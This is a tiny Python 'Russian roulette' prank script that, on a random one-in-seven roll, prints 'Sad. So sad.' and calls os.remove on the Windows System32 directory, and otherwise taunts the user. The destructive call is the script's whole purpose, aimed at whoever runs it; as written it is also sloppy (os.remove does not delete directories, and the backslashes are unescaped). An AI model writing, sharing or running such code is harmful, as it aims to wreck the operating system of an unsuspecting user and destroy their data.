import random
import os

if random.randint(0, 6) == 1:
    print("Sad. So sad.")
    os.remove('C:\Windows\System32')
else:
    print("You're lucky, but will you still be lucky next time?")